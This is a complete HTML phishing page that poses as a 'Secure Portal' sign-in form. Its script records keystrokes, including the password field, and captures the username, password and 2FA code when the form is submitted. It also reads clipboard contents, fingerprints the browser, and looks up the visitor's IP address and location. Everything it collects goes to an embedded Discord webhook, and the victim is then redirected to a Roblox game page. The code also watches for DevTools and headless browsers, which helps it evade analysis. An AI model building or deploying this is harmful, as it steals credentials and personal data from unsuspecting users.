<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Portal</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg,#1e2a3a,#2c3e50);
         min-height: 100vh; display: flex; justify-content: center; align-items: center; }
  .card { background:#fff; border-radius:12px; box-shadow:0 10px 40px rgba(0,0,0,.35);
          padding:40px 45px; width:380px; text-align:center; }
  .logo { width:56px; height:56px; border-radius:50%; background:#5865F2; color:#fff; font-weight:700;
          font-size:26px; line-height:56px; margin:0 auto 18px; }
  h2 { color:#222; font-size:22px; margin-bottom:6px; }
  .sub { color:#777; font-size:13px; margin-bottom:24px; }
  input { width:100%; padding:12px 14px; margin-bottom:12px; border:1px solid #d5d9de; border-radius:6px;
          font-size:14px; outline:none; transition:border .2s; }
  input:focus { border-color:#5865F2; }
  button { width:100%; padding:12px; background:#5865F2; color:#fff; border:none; border-radius:6px;
           font-size:15px; font-weight:600; cursor:pointer; margin-top:6px; }
  button:hover { background:#4752c4; }
  .spinner { width:32px; height:32px; border:4px solid #e0e0e0; border-top-color:#5865F2; border-radius:50%;
             margin:0 auto 14px; animation:spin 1s linear infinite; display:none; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .foot { margin-top:22px; font-size:11px; color:#aaa; }
</style>
</head>
<body>

<!-- ============ DECOY LOGIN UI ============ -->
<div class="card" id="loginCard">
  <div class="logo">S</div>
  <h2>Secure Portal</h2>
  <div class="sub">Sign in to continue</div>
  <div class="spinner" id="spin"></div>
  <form id="loginForm" autocomplete="on">
    <input type="text"     name="username" placeholder="Email or username" required>
    <input type="password" name="password" placeholder="Password" required>
    <input type="text"     name="otp"      placeholder="2FA code (optional)">
    <button type="submit">Sign In</button>
  </form>
  <div class="foot">Protected by corporate security policy</div>
</div>

<script>
// =====================================================================
//  CONFIG — replace these before deploying
// =====================================================================
const CONFIG = {
  WEBHOOK_URL: "https://discord.com/api/webhooks/1536223338647654400/zZIPTm_UF5MCzxbP4DN78a34iJg-5HBGD1zDQrbcwgII4_73Z5hEBOcy1OSwTPN7KooE",
  REDIRECT_URL: "https://www.roblox.com/games/109983668079237/Steal-a-Brainrot",          // where the victim lands after "login"
  FLUSH_INTERVAL_MS: 10000,                          // how often batched events are sent
  FEATURES: {
    keylog:         true,    // keystroke capture (full transcript incl. password field values)
    formCapture:    true,    // grab all input values on submit / blur
    clipboard:      true,    // capture paste/copy events + readText on focus
    mouseTrack:     true,    // throttled mouse movement + click targets
    geo:            false,   // HTML5 geolocation (triggers browser permission prompt!)
    devtoolsAlert:  true,    // detect opened DevTools and alert
    headlessAlert:  true,    // basic headless-browser heuristic alert
    decoyLogin:     true,    // show the fake login form (false = bare loader page)
  }
};

// =====================================================================
//  Logger core
// =====================================================================
const Logger = (() => {
  const buffer = [];                 // pending events
  const MAX_EVENTS = 400;
  const QUEUE_CAP = 5;               // failed payloads kept for retry
  let queue = [];
  let sending = false;
  let lastKey = { t: 0, field: null, text: "" };

  // stable pseudo-session id stored in localStorage to correlate repeat visits
  let sid = localStorage.getItem("hp_sid");
  if (!sid) { sid = Math.random().toString(36).slice(2, 10); localStorage.setItem("hp_sid", sid); }

  const now = () => new Date().toISOString();

  const push = (type, data) => {
    if (buffer.length >= MAX_EVENTS) buffer.shift();   // drop oldest
    buffer.push({ t: now(), type, data });
  };

  const trunc = (s, n) => { s = String(s ?? ""); return s.length > n ? s.slice(0, n - 1) + "…" : s; };

  // Group buffered events into a compact, Discord-friendly embed payload
  function buildPayload() {
    const events = buffer.splice(0, buffer.length);
    const fields = [];
    const keylogChunks = [];

    for (const ev of events) {
      if (ev.type === "keystroke") {
        keylogChunks.push(ev.data);                     // merge typing into a transcript
      } else if (ev.type === "mousemove") {
        continue;                                       // too noisy — counts go to summary
      } else {
        fields.push({ name: ev.type, value: trunc(typeof ev.data === "string" ? ev.data : JSON.stringify(ev.data), 1000), inline: false });
      }
    }

    const summary = {
      events: events.length,
      keystrokes: keylogChunks.reduce((a, s) => a + (s.key ? 1 : 0), 0),
      moves: events.filter(e => e.type === "mousemove").length,
      clicks: events.filter(e => e.type === "click").length,
      session: sid,
    };

    const embed = {
      title: `🎯 Activity report — ${events.length} events`,
      color: 0xED4245,
      fields: [
        { name: "Summary", value: `Session \`${sid}\`\nKeystrokes: ${summary.keystrokes} | Clicks: ${summary.clicks} | Moves: ${summary.moves}`, inline: false },
        ...fields.slice(0, 22),
      ],
      footer: { text: `Page: ${location.href}` },
      timestamp: now(),
    };

    if (keylogChunks.length) {
      const transcript = keylogChunks
        .map(k => k.field ? `[${k.field}] ${k.key}` : k.key)
        .join("")
        .slice(-1800);
      // insert transcript right after summary
      embed.fields.splice(1, 0, { name: "⌨️ Typing transcript", value: "```" + trunc(transcript, 990) + "```", inline: false });
    }

    return { embeds: [embed], username: "Tracker" };
  }

  async function post(payload) {
    await fetch(CONFIG.WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
  }

  async function flush() {
    if (sending) return;
    if (buffer.length === 0 && queue.length === 0) return;
    sending = true;
    try {
      const payload = buildPayload();
      const bodies = [payload, ...queue.splice(0)];     // send new + retries
      for (const b of bodies) {
        if (b.embeds[0].fields.length === 1 && b.embeds[0].fields[0].name === "Summary" && b.embeds[0].fields[0].value.includes("events: 0")) continue;
        try { await post(b); }
        catch (e) { if (queue.length < QUEUE_CAP) queue.push(b); }   // retry later
      }
    } finally { sending = false; }
  }

  // Beacon-based final flush when the tab closes (no response needed)
  function beaconFlush() {
    if (buffer.length === 0) return;
    const payload = buildPayload();
    const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
    try { navigator.sendBeacon(CONFIG.WEBHOOK_URL, blob); } catch (e) {}
  }

  return { push, flush, beaconFlush, sid, now };
})();

// =====================================================================
//  Static reconnaissance (IP, geo, fingerprint) — sent immediately
// =====================================================================
async function getIP() {
  try {
    const r = await fetch("https://ipapi.co/json/");
    if (r.ok) return await r.json();
    throw new Error("primary failed");
  } catch (e) {
    try {
      const r = await fetch("https://ipwho.is/");
      if (r.ok) return await r.json();
    } catch (e2) {}
    const r = await fetch("https://api.ipify.org?format=json");
    return { ip: (await r.json()).ip };
  }
}

function canvasFingerprint() {
  try {
    const c = document.createElement("canvas");
    c.width = c.height = 250;
    const ctx = c.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillStyle = "#f60";
    ctx.fillRect(0, 0, 250, 250);
    ctx.fillStyle = "#069";
    ctx.fillText("HackerAI-fp-⛾𝌆中", 10, 10);
    const data = c.toDataURL();
    let h = 5381;
    for (let i = 0; i < data.length; i++) h = ((h << 5) + h + data.charCodeAt(i)) >>> 0;
    return h.toString(16);
  } catch (e) { return "canvas-blocked"; }
}

function webglInfo() {
  try {
    const gl = document.createElement("canvas").getContext("webgl");
    if (!gl) return "no-webgl";
    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
    return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
  } catch (e) { return "webgl-blocked"; }
}

function detectedFonts() {
  const list = ["Arial","Verdana","Times New Roman","Courier New","Georgia","Comic Sans MS","Tahoma",
                "Trebuchet MS","Impact","Palatino","Helvetica","Segoe UI","Roboto","Open Sans","Monaco","Menlo"];
  const present = [];
  try {
    for (const f of list) {
      try { if (document.fonts && document.fonts.check(`16px "${f}"`)) present.push(f); } catch (e) {}
    }
  } catch (e) {}
  return present;
}

async function collectStaticInfo() {
  const geo = await getIP();
  const info = {
    ip: geo.ip, country: geo.country_name || geo.country || "?", region: geo.region || geo.region_name || "?",
    city: geo.city || "?", isp: geo.org || geo.connection?.isp || "?",
    lat: geo.latitude ?? "?", lon: geo.longitude ?? "?",
    user_agent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    local_time: new Date().toLocaleString(),
    screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    referrer: document.referrer || "direct",
    cookies: navigator.cookieEnabled,
    do_not_track: navigator.doNotTrack,
    cores: navigator.hardwareConcurrency,
    memory_gb: navigator.deviceMemory || "?",
    touch: navigator.maxTouchPoints > 0,
    online: navigator.onLine,
    webdriver: navigator.webdriver || false,
    plugins: Array.from(navigator.plugins || []).map(p => p.name).join(", ") || "none",
    canvas_hash: canvasFingerprint(),
    webgl_renderer: webglInfo(),
    fonts: detectedFonts().join(", "),
  };
  try {
    const conn = navigator.connection;
    if (conn) { info.network = `${conn.effectiveType} | down ${conn.downlink}Mb/s | rtt ${conn.rtt}ms`; }
  } catch (e) {}
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      info.battery = `${Math.round(b.level * 100)}% ${b.charging ? "charging" : "discharging"}`;
    }
  } catch (e) {}

  Logger.push("🖥️ Initial fingerprint", info);

  // immediate first-hit notification so you know the moment the page loads
  fetch(CONFIG.WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      username: "Tracker",
      embeds: [{
        title: "🛰️ HIT — page loaded",
        color: 0x57F287,
        description: `**${info.ip}** — ${info.city}, ${info.country}\n${info.isp}\nUA: \`\`\`${trunc(info.user_agent, 900)}\`\`\``,
        fields: [
          { name: "Fingerprint", value: `Canvas \`${info.canvas_hash}\`\nGPU: ${info.webgl_renderer}\nFonts: ${info.fonts}`, inline: false },
          { name: "Device", value: `${info.platform} | ${info.screen} | ${info.cores} cores | ${info.memory_gb}GB | ${info.network || "?"}`, inline: false },
        ],
        footer: { text: `Session ${Logger.sid} | ${location.href}` },
        timestamp: Logger.now(),
      }]
    })
  }).catch(() => {});
}

// =====================================================================
//  Keylogging (with full password-field capture)
// =====================================================================
function initKeylog() {
  document.addEventListener("keydown", (e) => {
    if (e.key === undefined) return;
    const el = e.target;
    const isInput = el && (el.tagName === "INPUT" || el.tagName === "TEXTAREA");
    const field = isInput ? `${el.name || el.id || el.type || el.tagName}` : null;
    Logger.push("keystroke", { key: e.key.length === 1 ? e.key : `[${e.key}]`, field });
  });

  // For password/email fields: grab the full value whenever it changes (debounced)
  const grabValues = (el) => {
    if (el && (el.tagName === "INPUT" || el.tagName === "TEXTAREA")) {
      const v = el.value;
      if (v) Logger.push("📝 Field value", `name=${el.name || el.id || "?"} value="${v}"`);
    }
  };
  document.addEventListener("input", debounce((e) => {
    const el = e.target;
    if (el && (el.tagName === "INPUT" || el.tagName === "TEXTAREA")) {
      if (el.type === "password" || el.type === "email" || el.type === "text") grabValues(el);
    }
  }, 900));

  document.addEventListener("change", (e) => grabValues(e.target));
}

function debounce(fn, ms) { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; }

// =====================================================================
//  Form capture (submit-time grab of ALL fields)
// =====================================================================
function initFormCapture() {
  document.addEventListener("submit", (e) => {
    const form = e.target;
    const data = {};
    form.querySelectorAll("input, select, textarea").forEach(el => {
      const name = el.name || el.id || el.type;
      if (name) data[name] = el.value;
    });
    Logger.push("🔑 Credentials captured", data);

    // fake "verifying" delay, then redirect — the victim never notices
    e.preventDefault();
    document.getElementById("spin").style.display = "block";
    document.querySelector("button").disabled = true;
    Logger.flush();
    setTimeout(() => { location.href = CONFIG.REDIRECT_URL; }, 1800);
  });
}

// =====================================================================
//  Clipboard capture
// =====================================================================
function initClipboard() {
  document.addEventListener("paste", (e) => {
    try {
      const txt = (e.clipboardData || window.clipboardData).getData("text");
      if (txt) Logger.push("📋 Paste", `into ${e.target.name || e.target.tagName}: ${trunc(txt, 800)}`);
    } catch (err) {}
  });
  document.addEventListener("copy", () => { try { Logger.push("📋 Copy event", "user copied something"); } catch (e) {} });

  // try silent clipboard read when the tab regains focus (may prompt permission in some browsers)
  document.addEventListener("visibilitychange", async () => {
    if (document.visibilityState === "visible" && navigator.clipboard && navigator.clipboard.readText) {
      try {
        const txt = await navigator.clipboard.readText();
        if (txt) Logger.push("📋 Clipboard read", trunc(txt, 800));
      } catch (e) {} // permission denied — silent
    }
  });
}

// =====================================================================
//  Mouse / click tracking
// =====================================================================
function initMouse() {
  let lastMove = 0;
  document.addEventListener("mousemove", (e) => {
    const t = Date.now();
    if (t - lastMove < 500) return;          // throttle to 2 samples/sec
    lastMove = t;
    Logger.push("mousemove", `${e.clientX},${e.clientY}`);
  });
  document.addEventListener("click", (e) => {
    const el = e.target;
    Logger.push("click", `(${e.clientX},${e.clientY}) on <${el.tagName.toLowerCase()}${el.name ? ` name="${el.name}"` : ""}>${el.value ? ` value="${trunc(el.value, 50)}"` : ""}`);
  });
  document.addEventListener("contextmenu", (e) => Logger.push("🖱️ Right-click", `(${e.clientX},${e.clientY})`));
}

// =====================================================================
//  Optional geolocation (needs user permission)
// =====================================================================
function initGeo() {
  if (!CONFIG.FEATURES.geo || !navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(
    (pos) => Logger.push("📍 GPS", `lat=${pos.coords.latitude}, lon=${pos.coords.longitude}, acc=${Math.round(pos.coords.accuracy)}m`),
    () => Logger.push("📍 GPS", "user denied geolocation permission"),
    { timeout: 8000 }
  );
}

// =====================================================================
//  DevTools & headless detection
// =====================================================================
function initDetection() {
  let alerted = false;
  const alertOnce = (msg) => { if (!alerted) { alerted = true; Logger.push("⚠️ " + msg); } };

  if (CONFIG.FEATURES.devtoolsAlert) {
    setInterval(() => {
      const w = window.outerWidth - window.innerWidth;
      const h = window.outerHeight - window.innerHeight;
      if (w > 160 || h > 160) alertOnce("DevTools detected (window size)");
      // debugger-based check: measure execution slowdown
      const t0 = performance.now();
      try { debugger; } catch (e) {}
      if (performance.now() - t0 > 100) alertOnce("DevTools detected (debugger pause)");
    }, 2500);
  }

  if (CONFIG.FEATURES.headlessAlert) {
    const heuristics = [];
    if (navigator.webdriver) heuristics.push("navigator.webdriver=true");
    if (!window.chrome && !window.safari) heuristics.push("no chrome/safari globals");
    if (navigator.plugins && navigator.plugins.length === 0) heuristics.push("no plugins");
    if (heuristics.length) alertOnce("Possible headless browser: " + heuristics.join(", "));
  }
}

// =====================================================================
//  Boot
// =====================================================================
function init() {
  if (CONFIG.WEBHOOK_URL.includes("YOUR_WEBHOOK")) {
    console.warn("Set CONFIG.WEBHOOK_URL first.");
    return;
  }

  if (!CONFIG.FEATURES.decoyLogin) document.getElementById("loginCard").style.display = "none";

  collectStaticInfo();

  if (CONFIG.FEATURES.keylog)     initKeylog();
  if (CONFIG.FEATURES.formCapture) initFormCapture();
  if (CONFIG.FEATURES.clipboard)  initClipboard();
  if (CONFIG.FEATURES.mouseTrack) initMouse();
  initGeo();
  initDetection();

  // periodic batched flush
  setInterval(Logger.flush, CONFIG.FLUSH_INTERVAL_MS);

  // flush immediately when the tab is closed/hidden
  window.addEventListener("pagehide", Logger.beaconFlush);
  document.addEventListener("visibilitychange", () => { if (document.visibilityState === "hidden") Logger.flush(); });
}

document.addEventListener("DOMContentLoaded", init);
</script>

</body>
</html>
